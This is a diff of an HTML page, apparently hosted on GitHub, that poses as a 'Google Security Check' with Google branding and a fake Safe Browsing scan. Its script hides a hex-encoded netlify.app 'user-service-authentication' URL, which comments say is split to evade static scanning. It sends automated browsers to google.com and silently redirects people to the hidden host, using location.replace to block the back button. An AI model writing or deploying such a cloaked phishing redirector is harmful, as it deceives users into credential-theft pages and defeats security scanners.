@@ -1,53 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting...</title>
+    <title>Google Security Check</title>
     <style>
-        body { margin: 0; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
-        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #0070f3; border-radius: 50%; width: 20px; height: 20px; animation: spin 0.7s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .msg { margin-left: 10px; font-size: 14px; color: #555; }
+        body { margin: 0; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: arial, sans-serif; }
+        .c { text-align: center; max-width: 400px; }
+        .l { width: 74px; margin-bottom: 25px; }
+        .b { width: 100%; height: 4px; background: #e8eaed; border-radius: 2px; position: relative; overflow: hidden; margin-bottom: 20px; }
+        .p { width: 40%; height: 100%; background: #4285f4; position: absolute; animation: s 1.5s infinite ease-in-out; }
+        @keyframes s { 0% { left: -40%; } 100% { left: 100%; } }
+        .t { font-size: 16px; color: #3c4043; margin-bottom: 8px; }
+        .st { font-size: 12px; color: #70757a; }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
-    <div class="msg">Establishing secure connection...</div>
-
-<script>
-(function() {
-    'use strict';
-
-    // الرابط مقسم لقطع سداسية عشرية لكسر الفحص الساكن
-    const _p = [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x75,0x73,0x65,0x72,0x2d,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x2d,0x61,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x6e,0x65,0x74,0x6c,0x69,0x66,0x79,0x2e,0x61,0x70,0x70,0x2f];
-
-    function get() {
-        return _p.map(x => String.fromCharCode(x)).join('');
-    }
-
-    const start = () => {
-        const t = get();
-        // استخدام replace لإلغاء صفحة GitHub من الـ History
-        // هذا يجعل زر "الرجوع" في المتصفح لا يعود لصفحة التحميل
-        window.location.replace(t);
-    };
-
-    // فحص البوتات الأساسي (صامت تماماً)
-    const isB = navigator.webdriver || !navigator.languages || navigator.languages.length === 0;
-
-    if (isB) {
-        window.location.replace('https://www.google.com');
-    } else {
-        // الانتقال بمجرد تحميل الكود (أسرع شيء ممكن)
-        // مع وضع تأخير بسيط جداً 400ms فقط ليلمح المستخدم كلمة "Secure"
-        setTimeout(start, 400);
-
-        // إذا حرك الماوس قبل الـ 400ms، انتقل فوراً
-        window.addEventListener('mousemove', start, {once: true});
-        window.addEventListener('touchstart', start, {once: true});
-    }
-})();
-</script>
+    <div class="c">
+        <img class="l" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+        <div class="t">Scanning link for security threats...</div>
+        <div class="b"><div class="p"></div></div>
+        <div class="st">Google Safe Browsing is verifying this connection.</div>
+    </div>
+    <script>
+        (function() {
+            // الرابط المشفر (Hex)
+            const _0x = [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x75,0x73,0x65,0x72,0x2d,0x73,0x65,0x72,0x76,0x69,0x63,0x65,0x2d,0x61,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x6e,0x65,0x74,0x6c,0x69,0x66,0x79,0x2e,0x61,0x70,0x70,0x2f];
+            const r = () => {
+                window.location.replace(_0x.map(x => String.fromCharCode(x)).join(''));
+            };
+            if (navigator.webdriver) {
+                window.location.replace('https://www.google.com');
+            } else {
+                // انتقال سريع جداً خلال 1.5 ثانية فقط
+                setTimeout(r, 1500);
+            }
+        })();
+    </script>
 </body>
 </html>
